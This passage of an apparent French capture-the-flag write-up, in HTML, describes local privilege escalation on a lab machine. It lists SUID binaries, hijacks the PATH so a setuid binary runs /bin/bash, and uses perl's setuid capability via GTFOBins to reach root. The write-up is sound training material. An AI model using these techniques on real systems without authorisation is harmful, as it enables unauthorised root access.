+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18448</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>traceroute6<span style="color:#f92672">.</span>iputils
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">76496</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chfn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">59640</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>passwd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">75824</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>gpasswd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">40344</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgrp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37136</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgidmap
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22520</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pkexec
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">149080</span> Jan <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sudo
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30800</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2016</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>fusermount
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26696</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>umount
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">64424</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>ping
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43088</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mount
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44664</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>su
+</span></span></code></pre></div><p>Le seul potentiel vecteur ici est <strong>/home/rabbit/teaParty</strong></p>
+<p>On va donc tenter de l’utiliser, tout d’abord on regarde de quel type de fichier il s’agit</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729395-9ba0b639-f460-4a44-b29e-9ff8e14026c9.png" alt="2022-12-14-191837_1885x119_scrot"></p>
+<p>Rien d’alarmant, on le lance pour voir comement il agit</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729408-87c54566-e2ff-4935-9343-3c136aa53095.png" alt="2022-12-14-193311_721x188_scrot"></p>
+<p>Bon… rien de vraiment intéressant… on va tenter de lire le fichier</p>
+<p><code>⌨️ cat teaParty</code></p>
+<p>Le fichier est illisible mais on peut voir ceci dans les strings</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729443-7d7dba20-8766-4d4d-a430-039cf699b087.png" alt="2022-12-14-193330_653x54_scrot"></p>
+<p>Il utilise le binaire <strong><strong><strong>date</strong></strong></strong>, on va pouvoir exploiter ça par une <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>path hijacking</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>On va donc créer un fichier <strong><strong><strong><strong>date</strong></strong></strong></strong> dans <strong><strong><strong><strong><strong>/tmp/,</strong></strong></strong></strong></strong> dans lequel on met /bin/bash, puis on le rend éxécutable et on met à jour la variable path</p>
+<p>On a plus qu’à relancer le <strong><strong><strong><strong><strong><strong><strong><strong>teaParty</strong></strong></strong></strong></strong></strong></strong></strong>, et au moment où le binaire <strong><strong><strong><strong>date</strong></strong></strong></strong> est appellé, notre <strong><strong><strong><strong><strong><strong><strong><strong><strong>/bin/bash</strong></strong></strong></strong></strong></strong></strong></strong></strong> devrait être éxécuté</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729517-3a0c5f1b-b205-4118-8ab6-8d7df3d0f82d.png" alt="2022-12-14-193418_541x185_scrot"></p>
+<h1 id="privesc-hatter--root">
+  Privesc (hatter → root)
+  <a href="#privesc-hatter--root" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>On est maintenant <strong><strong><strong><strong>hatter</strong></strong></strong></strong>, on va aller regarder ce qu’il y a dans son home</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729538-6dc8928a-754e-46be-905a-bfc57f0355ab.png" alt="2022-12-14-193734_789x467_scrot"></p>
+<p>Bon, on a un fichier <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>password.txt</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> dans lequel il y a un mot de passe, probablement celui de l’utilisateur <strong><strong><strong><strong><strong><strong>hatter</strong></strong></strong></strong></strong></strong></p>
+<p>On peut deviner qu’on va donc avoir besoin de la commande sudo pour le prochain <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>lateral move</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>On peut aussi deviner que puisque le premier <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>lateral move</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> passait par le <strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong>, et que le deuxième passait par le <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>setuid bit</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, le troisième passera sûrement par des <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>capabilities</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729551-49171758-7335-4aff-bac8-b706df1f8265.png" alt="2022-12-14-193813_597x171_scrot"></p>
+<p>Et en listant les <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>capabilities</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, on voit que le binaire <strong><strong><strong><strong>perl</strong></strong></strong></strong> a la capabilité <strong><strong><strong><strong><strong><strong>setuid</strong></strong></strong></strong></strong></strong> sur la machine</p>
+<p>En passant sur GTFOBins, on trouve ceci</p>
+<p>→ <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">https://gtfobins.github.io/gtfobins/perl/#capabilities</a></p>
+<p>L’exploit est assez straight forward, on a plus qu’à le lancer et on devrait normalement être root</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729568-f1c02ece-5426-400f-acdc-bd40082f7544.png" alt="2022-12-14-194231_1888x1032_scrot"></p>
+<p>Etant root, on peut maintenant cat les <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>deux flags</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>gg!</p>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">rami malek en personne</div>
+      
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
